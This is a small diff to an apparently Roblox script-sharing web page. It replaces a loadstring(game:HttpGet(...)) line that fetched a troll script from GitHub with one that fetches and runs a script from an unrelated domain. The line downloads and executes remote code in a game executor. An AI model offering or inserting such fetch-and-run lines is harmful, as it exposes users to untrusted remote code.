@@ -351,7 +351,7 @@ Link; 🡢 https://socialwolvez.com/app/l/1VppYv
                 <i class='bx bxs-lock-alt'></i>
             </div>
 
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ginxys/Doors-Troll/main/Script.Lua"))()
+     loadstring(game:HttpGet("https://api.hugebonus.xyz/scripts/TrollFaceSpawner.lua"))()
   </form>    
 </body>
 </html>
